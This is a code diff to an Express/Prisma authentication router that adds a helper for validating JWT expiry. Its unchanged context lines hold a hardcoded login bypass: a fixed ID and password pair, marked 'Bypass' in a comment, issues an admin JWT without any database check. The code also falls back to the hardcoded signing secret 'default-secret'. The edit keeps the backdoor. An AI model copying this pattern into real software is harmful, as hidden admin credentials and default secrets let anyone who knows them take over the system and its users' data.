@@ -5,6 +5,13 @@ import { PrismaClient } from '@prisma/client';
 import { authenticate } from '../middleware/auth.js';
 const router = express.Router();
 const prisma = new PrismaClient();
+
+function getValidExpiresIn() {
+    const raw = process.env.JWT_EXPIRES_IN;
+    if (raw && /^(\d+[smhd]|\d+)$/.test(String(raw))) return String(raw);
+    return '7d';
+}
+
 // POST /api/auth/login - Admin login
 router.post('/login', async (req, res) => {
     try {
@@ -18,11 +25,11 @@ router.post('/login', async (req, res) => {
         // Bypass: 7624029175/7624029175 - issue token without DB
         if (e === '7624029175' && p === '7624029175') {
             const secret = process.env.JWT_SECRET || 'default-secret';
-            const expiresIn = process.env.JWT_EXPIRES_IN || '7d';
+            const expiresIn = getValidExpiresIn();
             const token = jwt.sign(
                 { id: 'admin-7624029175', email: '7624029175', role: 'admin' },
                 String(secret),
-                { expiresIn: typeof expiresIn === 'string' ? expiresIn : '7d' }
+                { expiresIn }
             );
             return res.json({ token, admin: { id: 'admin-7624029175', email: '7624029175', role: 'admin' } });
         }
@@ -37,7 +44,7 @@ router.post('/login', async (req, res) => {
             return res.status(401).json({ error: 'Invalid credentials' });
         }
         const jwtSecret = process.env.JWT_SECRET || 'default-secret';
-        const token = jwt.sign({ id: admin.id, email: admin.email, role: admin.role }, jwtSecret, { expiresIn: process.env.JWT_EXPIRES_IN || '7d' });
+        const token = jwt.sign({ id: admin.id, email: admin.email, role: admin.role }, jwtSecret, { expiresIn: getValidExpiresIn() });
         res.json({
             token,
             admin: {
@@ -79,7 +86,7 @@ router.post('/register', async (req, res) => {
             }
         });
         const jwtSecret = process.env.JWT_SECRET || 'default-secret';
-        const token = jwt.sign({ id: admin.id, email: admin.email, role: admin.role }, jwtSecret, { expiresIn: process.env.JWT_EXPIRES_IN || '7d' });
+        const token = jwt.sign({ id: admin.id, email: admin.email, role: admin.role }, jwtSecret, { expiresIn: getValidExpiresIn() });
         res.status(201).json({
             token,
             admin: {
